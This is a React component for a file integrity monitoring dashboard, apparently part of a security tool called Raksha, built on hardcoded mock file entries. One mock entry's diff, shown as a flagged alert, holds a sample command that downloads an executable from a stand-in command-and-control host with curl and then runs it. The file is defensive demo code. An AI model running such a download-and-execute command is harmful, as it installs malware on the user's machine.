import React, { useState } from 'react';
import { Box, Typography, Chip, Button, Stack, Dialog, DialogTitle, DialogContent, DialogActions } from '@mui/material';
import {
  InsertDriveFile, Shield, CheckCircle, Warning, Visibility, Psychology, Close
} from '@mui/icons-material';

const CR = '#DC2626';
const SAFE = '#22C55E';
const WARN = '#F59E0B';

export const FileProtectionView: React.FC<{ isDark: boolean; onAskRaksha?: (prompt: string) => void }> = ({
  isDark,
  onAskRaksha,
}) => {
  const [selectedDiffFile, setSelectedDiffFile] = useState<any | null>(null);

  const files = [
    { name: 'C:\\Windows\\System32\\drivers\\etc\\hosts', type: 'System Network Config', status: 'verified', modified: '4 days ago', desc: 'No unauthorized DNS redirection found' },
    { name: 'C:\\Users\\Jash\\Documents\\Financial_Q3.xlsx', type: 'Protected Document', status: 'verified', modified: '2 hours ago', desc: 'Authorized user edit • Canary intact' },
    { name: 'C:\\Users\\Jash\\AppData\\Local\\Temp\\update_patch.bat', type: 'Temporary Executable', status: 'suspicious', modified: '10:42 AM Today', desc: 'Unexpected batch script spawned without digital certificate', diff: '+ curl -s http://unknown-c2/drop.exe -o drop.exe\n+ start drop.exe' },
  ];

  const cardBg = isDark ? 'rgba(18, 20, 29, 0.85)' : 'rgba(255, 255, 255, 0.95)';
  const border = isDark ? 'rgba(255, 255, 255, 0.08)' : 'rgba(0, 0, 0, 0.08)';

  return (
    <Box
      sx={{
        p: { xs: 2.5, md: 4 },
        borderRadius: 4,
        bgcolor: cardBg,
        border: `1px solid ${border}`,
        boxShadow: isDark ? '0 16px 40px rgba(0,0,0,0.5)' : '0 12px 32px rgba(15,23,42,0.06)',
      }}
    >
      {/* Header */}
      <Box display="flex" justifyContent="space-between" alignItems="center" flexWrap="wrap" gap={2} mb={3}>
        <Box display="flex" alignItems="center" gap={1.5}>
          <Box
            sx={{
              width: 38,
              height: 38,
              borderRadius: 2.5,
              bgcolor: 'rgba(34, 197, 94, 0.12)',
              border: '1px solid rgba(34, 197, 94, 0.25)',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              color: SAFE,
            }}
          >
            <InsertDriveFile sx={{ fontSize: 22 }} />
          </Box>
          <Box>
            <Typography variant="h6" sx={{ fontFamily: 'Outfit, sans-serif', fontWeight: 800, lineHeight: 1.2 }}>
              File Protection & Integrity (FIM)
            </Typography>
            <Typography variant="caption" sx={{ color: 'text.secondary', fontWeight: 600 }}>
              Continuous Observation of Critical System Files & Canary Decoys
            </Typography>
          </Box>
        </Box>

        <Chip
          label="Canary Decoys Armed"
          sx={{
            fontFamily: 'JetBrains Mono, monospace',
            fontWeight: 800,
            fontSize: '0.68rem',
            bgcolor: 'rgba(34, 197, 94, 0.1)',
            color: SAFE,
            border: `1px solid rgba(34, 197, 94, 0.25)`,
          }}
        />
      </Box>

      {/* File List */}
      <Stack spacing={1.5}>
        {files.map((file, idx) => {
          const isSafe = file.status === 'verified';
          return (
            <Box
              key={idx}
              sx={{
                p: 2,
                px: 2.5,
                borderRadius: 2.5,
                bgcolor: isSafe
                  ? (isDark ? 'rgba(255,255,255,0.02)' : '#FDFCFB')
                  : (isDark ? 'rgba(220, 38, 38, 0.08)' : 'rgba(220, 38, 38, 0.05)'),
                border: `1px solid ${isSafe ? border : 'rgba(220, 38, 38, 0.3)'}`,
                display: 'flex',
                justifyContent: 'space-between',
                alignItems: 'center',
                flexWrap: 'wrap',
                gap: 1.5,
              }}
            >
              <Box display="flex" alignItems="center" gap={1.5}>
                {isSafe ? <CheckCircle sx={{ color: SAFE, fontSize: 22 }} /> : <Warning sx={{ color: CR, fontSize: 22 }} />}
                <Box>
                  <Typography sx={{ fontWeight: 800, fontSize: '0.88rem', color: isSafe ? 'text.primary' : CR, fontFamily: 'JetBrains Mono' }}>
                    {file.name}
                  </Typography>
                  <Typography sx={{ fontSize: '0.74rem', color: 'text.secondary', mt: 0.2 }}>
                    {file.type} • Modified {file.modified} • {file.desc}
                  </Typography>
                </Box>
              </Box>

              <Box display="flex" alignItems="center" gap={1}>
                {file.diff && (
                  <Button
                    size="small"
                    variant="outlined"
                    onClick={() => setSelectedDiffFile(file)}
                    startIcon={<Visibility sx={{ fontSize: 14 }} />}
                    sx={{ textTransform: 'none', fontWeight: 700, fontSize: '0.75rem', borderRadius: 2, borderColor: border }}
                  >
                    View Change
                  </Button>
                )}

                {onAskRaksha && (
                  <Button
                    size="small"
                    onClick={() => onAskRaksha(`Analyze file integrity alert for ${file.name}`)}
                    startIcon={<Psychology sx={{ fontSize: 14 }} />}
                    sx={{ textTransform: 'none', fontWeight: 700, fontSize: '0.75rem', color: '#3B82F6' }}
                  >
                    Ask Raksha
                  </Button>
                )}

                <Chip
                  label={isSafe ? 'VERIFIED' : 'UNEXPECTED CHANGE'}
                  size="small"
                  sx={{
                    fontWeight: 800,
                    fontSize: '0.65rem',
                    fontFamily: 'JetBrains Mono, monospace',
                    bgcolor: isSafe ? 'rgba(34, 197, 94, 0.12)' : 'rgba(220, 38, 38, 0.15)',
                    color: isSafe ? SAFE : CR,
                  }}
                />
              </Box>
            </Box>
          );
        })}
      </Stack>

      {/* Diff Modal */}
      <Dialog
        open={Boolean(selectedDiffFile)}
        onClose={() => setSelectedDiffFile(null)}
        maxWidth="sm"
        fullWidth
        PaperProps={{ sx: { borderRadius: 3.5, bgcolor: isDark ? '#0A0B10' : '#FFFFFF', border: `1px solid ${border}` } }}
      >
        <DialogTitle sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
          <Typography sx={{ fontFamily: 'Outfit', fontWeight: 800 }}>File Integrity Diff</Typography>
          <Button size="small" onClick={() => setSelectedDiffFile(null)}>Close</Button>
        </DialogTitle>
        <DialogContent>
          <Typography sx={{ fontSize: '0.8rem', color: 'text.secondary', mb: 1.5, fontFamily: 'JetBrains Mono' }}>
            {selectedDiffFile?.name}
          </Typography>
          <Box sx={{ p: 2, borderRadius: 2, bgcolor: isDark ? '#050508' : '#F1F5F9', border: `1px solid ${border}` }}>
            <Typography sx={{ fontFamily: 'JetBrains Mono', fontSize: '0.78rem', color: '#EF4444', whiteSpace: 'pre-wrap' }}>
              {selectedDiffFile?.diff}
            </Typography>
          </Box>
        </DialogContent>
      </Dialog>
    </Box>
  );
};
